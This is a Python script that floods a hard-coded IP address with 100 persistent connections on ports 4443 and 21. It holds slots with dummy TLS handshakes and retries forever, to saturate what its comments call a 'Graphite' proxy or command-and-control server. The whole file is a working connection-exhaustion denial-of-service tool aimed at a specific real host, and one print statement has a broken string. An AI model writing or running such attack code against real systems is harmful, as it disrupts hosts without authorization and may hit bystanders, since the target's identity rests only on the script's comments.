import socket
import threading
import time
import ssl

TARGET_IP = "46.183.184.147"
PORTS = [4443, 21]
CONCURRENT_CONNECTIONS = 50

def disrupt_port(port):
    print(f"[*] Starting disruption thread for port {port}...")
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET_IP, port))
            
            if port == 4443:
                # Keep the connection alive with a dummy SSL handshake
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                ssock = context.wrap_socket(sock, server_hostname="dinosaur.getfoxyproxy.org")
                # Stay connected to occupy a slot in the proxy/C2
                time.sleep(10)
                ssock.close()
            else:
                # Keep raw connection open for binary C2 port 21
                time.sleep(10)
                sock.close()
                
        except Exception:
            # Silently retry on connection reset or timeout
            pass
        time.sleep(0.1)

if __name__ == "__main__":
    print(f"[!] INITIATING COMMUNICATION DISRUPTION ON {TARGET_IP}")
    print(f"[!] Targeting Ports: {PORTS}")
    
    threads = []
    for port in PORTS:
        for _ in range(CONCURRENT_CONNECTIONS):
            t = threading.Thread(target=disrupt_port, args=(port,))
            t.daemon = True
            t.start()
            threads.append(t)
            
    print(f"[+] {len(threads)} disruption threads active. Graphite communication is being saturated.")
    
    # Keep the main script running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("
[*] Disruption terminated by operator.")
